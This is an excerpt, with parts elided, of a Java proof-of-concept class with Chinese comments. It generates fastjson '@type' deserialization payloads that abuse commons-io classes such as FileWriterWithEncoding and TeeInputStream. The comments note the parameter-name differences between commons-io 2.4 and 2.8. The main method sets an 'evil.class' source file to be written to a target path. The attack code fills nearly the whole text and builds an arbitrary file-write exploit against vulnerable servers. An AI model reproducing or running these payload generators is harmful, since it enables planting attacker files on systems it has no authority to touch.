...
/**
 * commons-io 2.4 版本中的参数问题。CharSequenceInputStream类是 c  FileWriterWithEncoding类参数是 encoding
 *
 * commons-io 2.8 版本中的参数问题。CharSequenceInputStream类是 cs  FileWriterWithEncoding类参数是 charsetName
 */
...
public class POC {
    ...
    /**
     * 生成 FileWriterWithEncoding 反序列化字符串c
     *
    ...
    public static String generateFileWriterWithEncoding(String filePath, boolean ref) {
        return String.format("{%s\"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\"," +
                "\"charsetName\":\"UTF-8\",\"file\":\"%s\"}", ref ? AUTOCLOSEABLE_TAG : "", filePath);
    }
    ...
    public static String generateTeeInputStream(String inputStream, String outputStream, boolean ref) {
        ...
        //return String.format("{%s\"@type\":\"org.apache.commons.codec.binary\",\"in\":%s}", ref ? AUTOCLOSEABLE_TAG : "", inputStream);
    ...
    public static void main(String[] args) {
        String file   = "d:/evil.class";//读文件的内容
        String target = "d:/www.class";//写入文件的内容
